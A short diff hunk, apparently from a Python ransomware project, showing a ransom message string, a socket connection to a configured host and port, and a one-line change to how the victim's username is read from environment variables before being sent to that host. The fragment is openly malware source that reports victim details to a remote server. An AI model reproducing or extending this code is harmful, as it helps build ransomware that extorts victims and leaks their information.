@@ -11,7 +11,7 @@ ransomeMSG ="your data has been infected whit sulfur \nsomething stinks in here 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect((HOST, PORT))
 
-user=os.environ.get('USER', os.environ.get('USERNAME'))
+user: str =str(os.environ.get('USER', os.environ.get('USERNAME')))
 
 client_socket.sendall(user.encode())
 
